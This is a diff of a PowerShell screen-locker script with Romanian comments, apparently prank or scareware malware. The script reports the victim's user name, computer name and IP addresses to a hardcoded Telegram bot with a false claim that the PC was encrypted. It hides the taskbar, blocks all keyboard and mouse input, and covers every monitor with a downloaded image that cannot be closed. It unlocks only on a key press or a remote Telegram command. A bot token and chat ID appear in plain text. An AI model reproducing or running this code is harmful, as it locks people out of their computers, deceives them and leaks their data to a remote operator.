@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Cod pentru input și taskbar
+# Cod nativ pt blocare și taskbar
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -12,47 +12,51 @@ public class Native {
 }
 "@
 
-# ▶️ Config și sistem
+# Config
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
 $chatID = '656189986'
 $botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
 
-# IP local
+# IP-uri
 $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
-    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
-
-# IP public
+    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' })[0].IPAddress
 try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-# ▶️ Trimite mesaj la pornire
+# Trimite mesaj Telegram
 $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
 $uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
 $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
-try { Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json' } catch {}
+try {
+    Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json'
+} catch { Write-Host "Eroare Telegram: $_" }
 
-# ▶️ Ascunde taskbar și blochează input
+# Ascunde Taskbar & blochează input
 $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 [Native]::ShowWindow($taskbar, 0)
 [Native]::BlockInput($true)
 
-# ▶️ Descarcă imaginea
+# Descarcă imaginea
 $temp = "$env:TEMP\poza_laptop.jpg"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
+try {
+    Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
+} catch {
+    [Native]::BlockInput($false)
+    Write-Host "Eroare descărcare imagine"
+    exit
+}
 
-# ▶️ Calculează full screen pe toate monitoarele
+# Dimensiune totală pe toate monitoarele
 $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
-$minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
-$minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
-$maxX = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
-$maxY = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
+$minX = ($bounds | ForEach-Object X) | Measure-Object -Minimum | Select -ExpandProperty Minimum
+$minY = ($bounds | ForEach-Object Y) | Measure-Object -Minimum | Select -ExpandProperty Minimum
+$maxX = ($bounds | ForEach-Object Right) | Measure-Object -Maximum | Select -ExpandProperty Maximum
+$maxY = ($bounds | ForEach-Object Bottom) | Measure-Object -Maximum | Select -ExpandProperty Maximum
 $width = $maxX - $minX
 $height = $maxY - $minY
 
-# ▶️ Variabilă globală
 $script:inchis = $false
 
-# ▶️ Funcție închidere completă
 function InchideTot {
     $script:inchis = $true
     [Native]::BlockInput($false)
@@ -60,7 +64,7 @@ function InchideTot {
     $form.Invoke([Action]{ $form.Close() })
 }
 
-# ▶️ Form mare
+# Fereastra principală
 $form = New-Object Windows.Forms.Form
 $form.StartPosition = 'Manual'
 $form.Location = New-Object Drawing.Point $minX, $minY
@@ -79,34 +83,30 @@ $pb.Dock = 'Fill'
 $pb.SizeMode = 'Zoom'
 $form.Controls.Add($pb)
 
-# ▶️ Închidere la tasta C
 $form.Add_KeyDown({
-    if ($_.KeyCode -eq 'C') {
-        InchideTot
-    }
+    if ($_.KeyCode -eq 'C') { InchideTot }
 })
-
 $form.Add_FormClosing({
     if (-not $script:inchis) { $_.Cancel = $true }
 })
 
-# ▶️ Verifică Telegram la fiecare 5 sec
-$timer = New-Object Windows.Forms.Timer
-$timer.Interval = 5000
-$timer.Add_Tick({
-    try {
-        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates"
-        foreach ($u in $updates.result) {
-            $text = $u.message.text
-            if ($text -eq "👍 $user" -or $text -eq "👍 $pc") {
-                $timer.Stop()
-                InchideTot
+# Buclă paralelă de verificare mesaje Telegram (într-un thread)
+Start-Job -ScriptBlock {
+    while ($true) {
+        try {
+            $updates = Invoke-RestMethod "https://api.telegram.org/bot$using:botToken/getUpdates"
+            foreach ($update in $updates.result) {
+                $txt = $update.message.text
+                if ($txt -eq "👍 $using:user" -or $txt -eq "👍 $using:pc") {
+                    Stop-Job -Id $MyInvocation.MyCommand.Id -Force
+                    $null = [System.Windows.Forms.Application]::OpenForms[0].Invoke([Action]{ $using:InchideTot.Invoke() })
+                }
             }
-        }
-    } catch {}
-})
-$timer.Start()
+        } catch {}
+        Start-Sleep -Seconds 5
+    }
+} | Out-Null
 
-# ▶️ Arată fereastra și rulează
+# Rulează aplicația
 $form.Show()
 [System.Windows.Forms.Application]::Run($form)
